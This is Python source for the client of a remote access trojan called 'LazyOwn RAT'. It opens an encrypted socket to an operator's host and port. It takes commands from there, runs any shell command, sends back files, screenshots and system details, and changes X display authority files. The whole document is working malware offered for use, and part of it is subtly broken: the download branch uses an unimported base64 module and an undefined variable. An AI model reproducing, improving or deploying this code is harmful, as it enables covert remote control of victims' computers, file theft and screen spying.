#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import socket
import signal
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import subprocess
import platform
import shutil

def signal_handler(sig, frame):
    global should_exit
    print("\n [<-] Saliendo...")
    should_exit = True

signal.signal(signal.SIGINT, signal_handler)

try:
    from PIL import ImageGrab
    screenshot_available = True
except (ImportError, OSError) as e:
    screenshot_available = False
    print(f"[-] Screenshot functionality is not available: {e}")

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(plaintext, key):
    plaintext = pad(plaintext)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

def handle_command(cmd, key):
    if cmd.startswith('upload'):
        _, filename = cmd.split(' ', 1)
        with open(filename, 'rb') as f:
            data = f.read()
        return data

    elif cmd.startswith('download'):
        _, filename = cmd.split(' ', 1)
        with open(filename, 'wb') as f:
            f.write(decrypt(base64.b64decode(data), key))
        return f'{filename} downloaded successfully'

    elif cmd == 'screenshot' and screenshot_available:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as f:
            data = f.read()
        os.remove('screenshot.png')
        return data

    elif cmd == 'sysinfo':
        info = f'System: {platform.system()}\n'
        info += f'Node Name: {platform.node()}\n'
        info += f'Release: {platform.release()}\n'
        info += f'Version: {platform.version()}\n'
        info += f'Machine: {platform.machine()}\n'
        info += f'Processor: {platform.processor()}\n'
        return info

    elif cmd == 'fix_xauth':
        try:
            os.system("touch ~/.Xauthority")
            os.system("xauth generate :0 . trusted")
            os.system("xauth add :0 . $(xxd -l 16 -p /dev/urandom)")
            os.environ['DISPLAY'] = ':0'
            return "Xauthority file created and DISPLAY set."
        except Exception as e:
            return f"Error fixing Xauthority: {e}"

    else:
        return subprocess.check_output(cmd, shell=True)

def main():
    # Banner de la herramienta
    BANNER = """
    ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
    ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
    ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
    ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
    ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    [*] Iniciando: LazyOwn RAT [;,;]
    """    
    print(BANNER)    
    parser = argparse.ArgumentParser(description='LazyOwnRAT Client')
    parser.add_argument('--host', required=True, help='Server host to connect to')
    parser.add_argument('--port', type=int, required=True, help='Server port to connect to')
    parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port
    KEY = binascii.unhexlify(args.key)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f'[+] Connected to {HOST}:{PORT}')

    try:
        while True:
            data = s.recv(4096)
            if not data:
                break

            cmd = decrypt(data, KEY).decode('utf-8')
            if cmd == 'quit':
                break

            result = handle_command(cmd, KEY)
            if isinstance(result, bytes):
                s.sendall(encrypt(result, KEY))
            else:
                s.sendall(encrypt(result.encode('utf-8'), KEY))

    except Exception as e:
        print(f'[e] Error: {e}')
    finally:
        s.close()

if __name__ == '__main__':
    main()
